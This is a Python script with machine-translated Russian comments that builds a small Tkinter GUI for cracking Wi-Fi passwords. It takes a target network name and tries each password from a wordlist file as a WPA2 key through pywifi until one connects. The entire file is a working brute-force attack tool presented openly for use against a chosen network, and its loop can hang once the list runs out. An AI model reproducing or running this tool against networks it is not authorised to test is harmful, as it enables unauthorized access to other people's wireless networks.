from tkinter import *
from pywifi import const
import pywifi
import time

# Основные шаги:
# 1, получите первую беспроводную сетевую карту
# 2. Отключить все Wi-Fi
# 3. Прочитайте книгу паролей
# 4, установите время сна

# Тестирование соединения
def wificonnect(str,wifiname):
    # Окно беспроводного объекта
    wifi = pywifi.PyWiFi()
    # Возьмите первую беспроводную сетевую карту
    ifaces = wifi.interfaces()[0]
    # Отключить все Wi-Fi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status()==const.IFACE_DISCONNECTED:
        # Создать файл подключения Wi-Fi
        profile = pywifi.Profile()
        profile.ssid = wifiname
        # алгоритм шифрования wifi
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # Wi-Fi пароль
        profile.key = str
        # Разработка NIC
        profile.auth = const.AUTH_ALG_OPEN
        # Модуль шифрования, здесь вам нужно написать какой-то модуль шифрования, или вы не можете подключиться
        profile.cipher = const.CIPHER_TYPE_CCMP

        # Удалить все файлы Wi-Fi
        ifaces.remove_all_network_profiles()
        # Установите новый файл подключения
        tep_profile = ifaces.add_network_profile(profile)
        # Подключиться
        ifaces.connect(tep_profile)
        time.sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def readPwd():
    # Получить имя
    wifiname = entry.get().strip()

    path = r'./wifipwd.txt'
    file = open(path,'r')
    while True:
        try:
            # Читать
            mystr = file.readline().strip()
            # Тестовое соединение
            bool = wificonnect(mystr,wifiname)
            if bool:
                text.insert(END,"Пароль правильный"+mystr)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END,'неправильный пароль'+mystr)
                text.see(END)
                text.update()

        except: continue

# Создать окно
root = Tk()
root.title("Wi-Fi трещина")
root.geometry('500x400')

# Теги
label = Label(root,text="Введите имя WIFI для взлома:")
#targeting
label.grid()
# Контроль ввода
entry  = Entry(root,font=("Microsoft Yahei",14))
entry.grid(row=0,column=1)
# Управление списком
text =Listbox(root,font=("Microsoft Yahei",14),width=40,height=10)
text.grid(row=1,columnspan=2)
 #Кнопка
button = Button(root,text = "Начать трескаться",width=20,height=2,command=readPwd)
button.grid(row=2,columnspan=2)

# Окно дисплея
root.mainloop()

